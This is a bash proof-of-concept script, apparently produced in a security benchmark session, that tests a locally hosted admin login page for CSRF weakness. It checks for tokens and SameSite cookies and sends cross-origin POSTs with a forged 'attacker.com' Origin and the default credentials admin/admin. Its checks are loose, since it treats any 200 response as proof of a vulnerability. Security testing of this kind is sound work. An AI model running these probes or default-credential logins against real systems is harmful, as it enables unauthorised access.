#!/bin/bash
# POC: Demonstrates CSRF vulnerability on admin login form by showing the server accepts login requests with cross-origin headers and no CSRF token validation
# Target: ./repo
# Created: 2025-11-07T16:17:14.810Z
# Session: benchmark-XBEN-078-24-mhp1edzb

# CSRF Vulnerability POC - Admin Login Form
# This script demonstrates that the admin login form is vulnerable to CSRF attacks
# by showing that the server accepts login requests from arbitrary origins without
# CSRF token validation.

TARGET_URL="${1:-http://localhost/admin.php}"
ATTACKER_ORIGIN="${2:-http://attacker.com}"

echo "========================================"
echo "CSRF Vulnerability POC - Admin Login"
echo "========================================"
echo "Target: $TARGET_URL"
echo "Attacker Origin: $ATTACKER_ORIGIN"
echo ""

# Step 1: Check if admin.php exists and is accessible
echo "[*] Step 1: Checking if admin login form is accessible..."
response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL")
if [ "$response" == "200" ]; then
    echo "[+] Admin form is accessible (HTTP $response)"
else
    echo "[-] Admin form not accessible (HTTP $response)"
    exit 1
fi
echo ""

# Step 2: Check for CSRF tokens in the form
echo "[*] Step 2: Checking for CSRF tokens in the form..."
csrf_tokens=$(curl -s "$TARGET_URL" | grep -i "csrf\|token\|nonce" | wc -l)
if [ "$csrf_tokens" -eq 0 ]; then
    echo "[+] No CSRF tokens found in HTML form"
else
    echo "[!] Found potential CSRF tokens (count: $csrf_tokens)"
fi
echo ""

# Step 3: Test cross-origin POST request
echo "[*] Step 3: Testing cross-origin login POST request..."
echo "[*] Sending login request with cross-origin headers..."
response=$(curl -s -X POST "$TARGET_URL" \
    -H "Origin: $ATTACKER_ORIGIN" \
    -H "Referer: $ATTACKER_ORIGIN" \
    -d "username=admin&password=admin" \
    -w "\n%{http_code}")

http_code=$(echo "$response" | tail -n 1)
body=$(echo "$response" | head -n -1)

echo "[*] Response Code: $http_code"

if [ "$http_code" == "200" ] || [ "$http_code" == "302" ] || [ "$http_code" == "303" ]; then
    echo "[+] VULNERABLE: Server accepted cross-origin login request!"
    echo "[+] This indicates no Origin validation is performed"
else
    echo "[-] Server rejected request with HTTP $http_code"
    echo "[-] This may indicate some CSRF protection is in place"
fi
echo ""

# Step 4: Check for SameSite cookie flags
echo "[*] Step 4: Checking for SameSite cookie protection..."
cookies=$(curl -s -i "$TARGET_URL" 2>&1 | grep -i "Set-Cookie" || echo "")
if [ -z "$cookies" ]; then
    echo "[+] No Set-Cookie headers found in initial request"
else
    echo "[*] Found cookies:"
    echo "$cookies"
    
    if echo "$cookies" | grep -i "SameSite" > /dev/null; then
        echo "[!] SameSite flag is present"
    else
        echo "[+] VULNERABLE: No SameSite flag on session cookies!"
    fi
fi
echo ""

# Step 5: Attempt login without CSRF token (direct POST)
echo "[*] Step 5: Testing direct POST without any CSRF token..."
response=$(curl -s -X POST "$TARGET_URL" \
    -d "username=test&password=test" \
    -w "\n%{http_code}" 2>&1)

http_code=$(echo "$response" | tail -n 1)

if [ "$http_code" == "200" ] || [ "$http_code" == "302" ] || [ "$http_code" == "303" ]; then
    echo "[+] VULNERABLE: Server processes login without CSRF token validation!"
    echo "[+] This is a critical CSRF vulnerability"
else
    echo "[!] Response code: $http_code"
fi
echo ""

echo "========================================"
echo "CSRF Vulnerability Assessment Complete"
echo "========================================"